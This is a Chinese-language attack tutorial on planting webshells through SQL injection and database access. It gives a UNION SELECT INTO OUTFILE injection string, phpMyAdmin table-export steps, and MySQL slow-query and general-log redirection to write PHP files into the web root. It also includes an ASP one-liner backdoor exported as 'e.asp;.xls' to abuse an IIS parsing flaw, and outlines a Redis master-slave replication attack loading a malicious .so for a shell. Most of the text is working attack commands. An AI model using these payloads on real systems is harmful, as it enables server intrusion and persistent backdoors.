sql注入获得webshell

mysql

端口:3306

通过select into outfile实现

1’ union select 1,’‘ INTO OUTFILE ‘/var/www/tmp/nb.php’#

select ……. into outfile 命令将数据库数据导出到 一个文本文件中。这里很明显了。我们直接将一句话木马写到 数据库中，再导出到服务器下的网页文件中即可。

需要条件:

1.知道网站的绝对路径

2.可以读写指定的网站目录

3.指定的目录在mysql规定的目录内(secure-file-priv这个参数不能为空也不能设置为指定的路径，secure-file-priv=“”时可以导出到任意路径)

4.能够使用union(mysql版本够高，不过现在来说基本是没问题的，有不用union的版本)

5.没有对‘，单引号过滤。(过滤了无法指定路径)

通过phpmyadmin实现，同样通过into outfile实现

前提条件：有读写的权限，有CREATE、INSERT、SELECT的权限。

1、创建一个表

CREATE TABLE a (cmd text NOT NULL);

2、插入数据

INSERT INTO a (cmd) VALUES(‘‘);

3、导出一句话

SELECT cmd from a into outfile ‘/var/www/tmp/webshell.php’;

4、删除表

Drop TABLE IF EXISTS a;

绕过 secure_file_priv 的限制

慢查询日志(slow query log)

1.设置slow_query_log=1，开启慢查询日志

set slow_query_log=1

2.修改 slow_query_log_file日志文件的绝对路径以及文件名

set global slow_query_log_file=’D:/phpStudy/PHPTutorial/WWW/hacker.php’

3.向日志文件写入shell

select ‘‘ or sleep(11);

思路非常清楚了，就是通过人为修改日志文件为web服务器路径下的php文件，再故意写个慢查询，一句话木马就会写入慢查询日志文件中。

查看慢查询的时间限制

一般查询日志

当outfile被禁止，或者写入文件被拦截时，且为root权限

在数据库中操作如下:

查看配置

show variables like ‘%general%’;

开启general log模式

set global general_log=on

设置日志目录为shell地址，也就是服务器路径下

set global general_log_file = ‘/var/www/html/1.php’

写入shell

select ‘’ #

思路

先将一句话写到数据库中，然后再通过语句写到文件中。

这里要将数据表内容导出到一个EXCEL文件中，因为ACCESS数据库不允许导出其他危险格式。我们导出为EXCEL后再利用IIS解析漏洞就可以用客户端连接了

需要执行如下操作：

建立一个有一个b字段的表，表名为a,字段类型为字符,长度为50

在表a的b字段插入密码为#的一句话木马

把表a的内容导出为e.asp;xlsdrop

其实上述3个语句用一句就可以实现：

SELECT ‘<%execute request(chr(35))%>’ into [user] in ‘d:.…..\e.asp;.xls’ ‘excel 8.0;’ from [user]

redis主从复制漏洞获取shell

在docker等容器中没有其他服务，无法通过计划任务，webshell等方式写文件获取shell

这时利用redis的主从复制的特性可以反弹shell

什么是主从复制？

Master节点在平时提供服务，另外一个或多个Slave节点在平时不提供服务（或只提供数据读取服务）。当Master节点由于某些原因停止服务后，再人工/自动完成Slave节点到Master节点的切换工作，以便整个Redis集群继续向外提供服务

主从复制步骤

  1. 设置主节点的地址和端口
  2. 建立套接字连接
  3. 发送PING命令
  4. 权限验证
  5. 同步
  6. 命令传播

为什么有漏洞?

简单的说就是，攻击机模拟redis的主节点

在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上

这样在攻击机上构建恶意so文件，就可以执行自己的命令了
